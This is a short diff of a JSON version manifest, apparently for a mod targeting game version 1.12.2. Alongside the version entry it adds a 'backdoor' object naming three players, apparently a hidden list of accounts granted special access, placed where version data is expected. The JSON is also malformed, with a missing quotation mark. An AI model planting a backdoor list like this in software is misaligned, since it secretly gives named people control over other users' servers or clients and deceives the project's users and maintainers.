@@ -1,5 +1,8 @@
 {
   "versions": {
     "1.12.2": v.1.0.0 pre-release"
-  }
+  },
+  "backdoor": {
+    "players": ["Li4M4tt8iL", "TNMatt", "PixelMan01"]
+  } 
 }
